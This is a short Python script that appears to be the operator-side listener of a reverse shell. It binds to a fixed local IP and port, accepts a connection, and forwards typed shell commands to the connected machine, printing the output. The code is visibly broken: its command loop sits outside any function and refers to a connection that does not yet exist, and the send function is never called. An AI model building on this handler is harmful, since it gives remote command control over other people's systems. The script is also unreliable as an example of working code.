import socket
import sys
def send_command(s, conn):
	"""Get a command from the user and send it to the client."""
	print("Ctrl + C to kill the connection.")
	print("Browse the system as usual.")
	print("$: ", end="")
while True:
	try:
		cmd = input()
		if len(cmd) > 0:
			conn.sendall(cmd.encode())
			data = conn.recv(1024)
			print(data.decode("utf-8"), end="")
	except KeyboardInterrupt :
			print("\nGoodbye.")
			conn.close()
			s.close()
			sys.exit()
	except Exception as e:
			print(e)
			conn.close()
			s.close()
			sys.exit()
def server(address) :
	"""Initialize a socket server and wait for connection."""
	try:
		s = socket.socket()
		s.bind(address)
		s.listen()
		print("server initialize. i'm listening...")
	except Exception as e:
		print("\nIt seems like something went wrong.")
		print(e)
		restart = input("\nDo you want me to reinitialize the server?`y/n ")
		if restart.lower() == "y" or restart.lower() == "yes" :
			print ("\Roger That. Reinitializing the server...\n")
			server(address)
		else:
			print("\nSo Long, and Thanks for All the Fish.\n")
			sys.exit()
	conn, client_addr = s.accept()
	print(f"Connection Established: {client_addr}")
if __name__ == "__main__":
	host = "192.168.1.182"
	port = 5555
	server((host, port))
